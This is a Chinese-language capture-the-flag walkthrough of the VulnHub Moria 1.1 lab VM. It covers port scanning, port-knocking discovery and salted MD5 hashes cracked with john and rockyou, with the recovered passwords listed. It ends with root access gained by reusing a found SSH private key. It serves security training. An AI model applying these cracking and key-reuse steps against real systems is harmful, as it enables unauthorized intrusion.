# Moria: 1.1

2024-8-11 https://www.vulnhub.com/entry/moria-11,187/

difficulty: Not easy

## IP

192.168.5.31

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey:
|   2048 47b5ede3f9ad9688c0f283237fa3d34f (RSA)
|   256 85cda2d8bb85f60f4eae8caa7352ec63 (ECDSA)
|_  256 b1777e08b3a084f8f45df98ed585b934 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Gates of Moria
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
```

ftp 不能匿名访问，先对 80 web 端口进行扫描。扫描出 http://192.168.5.31/w/h/i/s/p/e/r/the_abyss/ 并且每次发访问显示的都不同，像是个对话。

再次对 /w/h/i/s/p/e/r/the_abyss/ 进行扫描，发现完整的文本 http://192.168.5.31/w/h/i/s/p/e/r/the_abyss/random.txt

```
Balin: "Be quiet, the Balrog will hear you!"
Oin:"Stop knocking!"
Ori:"Will anyone hear us?"
Fundin:"That human will never save us!"
Nain:"Will the human get the message?"
"Eru! Save us!"
"We will die here.."
"Is this the end?"
"Knock knock"
"Too loud!"
Maeglin:"The Balrog is not around, hurry!"
Telchar to Thrain:"That human is slow, don't give up yet"
Dain:"Is that human deaf? Why is it not listening?"
```

发现一个用户名: Balrog

看到有 knock 的关键字，可能存在有端口敲震，有隐藏端口。使用 wireshark 抓包，继续访问这个 web 服务，发现了其他的端口，目标机器从 1337 对 kali 机器的 77 101 108 108 111 110 54 57 端口分别进行访问，这几个端口的数字对应的 ascii 码为 Mellon69 像是个密码，使用上面的 Balorg 作为用户名，尝试登陆 ftp 和 ssh。

最终发现 ftp 能够登陆。目录下发现 .bash_history 但是不能下载，cd .. 发现进入了目标机器的 / 目录中，进入到/var/www/html 中后发现了一个目录名为 QlVraKW4fbIkXau9zkAPNGzviT3UKntl 访问后得到了

```
Prisoner's name   Passkey
Balin   c2d8960157fc8540f6d5d66594e165e0
Oin	    727a279d913fba677c490102b135e51e
Ori	    8c3c3152a5c64ffb683d78efc3520114
Maeglin	6ba94d6322f53f30aca4f34960203703
Fundin	c789ec9fae1cd07adfc02930a39486a1
Nain	fec21f5c7dcf8e5e54537cfda92df5fe
Dain	6a113db1fd25c5501ec3a5936d817c29
Thrain	7db5040c351237e8332bfbba757a1019
Telchar	dd272382909a4f51163c77da6356cc6f
```

像是 md5 的值，查看源码后，又发现了一些提示：

```
<!--
6MAp84
bQkChe
HnqeN4
e5ad5s
g9Wxv7
HCCsxP
cC5nTr
h8spZR
tb9AWe

MD5(MD5(Password).Salt)
-->
```

上面的部分应该是 salt，现在知道了加密的方式为 MD5(MD5(Password).Salt) 则构造哈希文件的格式：

```
Balin:c2d8960157fc8540f6d5d66594e165e0$6MAp84
Oin:727a279d913fba677c490102b135e51e$bQkChe
Ori:8c3c3152a5c64ffb683d78efc3520114$HnqeN4
Maeglin:6ba94d6322f53f30aca4f34960203703$e5ad5s
Fundin:c789ec9fae1cd07adfc02930a39486a1$g9Wxv7
Nain:fec21f5c7dcf8e5e54537cfda92df5fe$HCCsxP
Dain:6a113db1fd25c5501ec3a5936d817c29$cC5nTr
Thrain:7db5040c351237e8332bfbba757a1019$h8spZR
Telchar:dd272382909a4f51163c77da6356cc6f$tb9AWe
```

john --list=subformats 发现 MD5(MD5(Password).Salt) 对应的加密模式为 `UserFormat = dynamic_1007 type = dynamic_1007: md5(md5($p).$s) (vBulletin)`

```
john --format=dynamic_1007 --wordlist=/usr/share/wordlists/rockyou.txt hash

flower           (Balin)
warrior          (Nain)
spanky           (Ori)
rainbow          (Oin)
abcdef           (Dain)
fuckoff          (Maeglin)
darkness         (Thrain)
magic            (Telchar)
hunter2          (Fundin)
```

最终发现 Ori:spanky 能够登陆，发现了.ssh 文件夹中有私钥和公钥，但是不知道这个私钥是不是 Ori 用户的，/etc/passwd 中发现了 3 个可用用户：Ori、abatchy、root，用私钥挨个尝试登陆这几个用户，看看私钥是哪个用户的，known_hosts 有一条 127.0.0.1 的记录，最终发现 root 用户才是这个私钥的用户，其他两个用户用这个私钥都不能登陆成功。 ssh -i id_rsa root@127.0.0.1 登陆，登陆成功，获得了 root 权限，拿到了最终的 flag:

```
[root@Moria ~]# cat flag.txt
“All that is gold does not glitter,
Not all those who wander are lost;
The old that is strong does not wither,
Deep roots are not reached by the frost.

From the ashes a fire shall be woken,
A light from the shadows shall spring;
Renewed shall be blade that was broken,
The crownless again shall be king.”

All That is Gold Does Not Glitter by J. R. R. Tolkien

I hope you suff.. enjoyed this VM. It wasn't so hard, was it?
-Abatchy
```
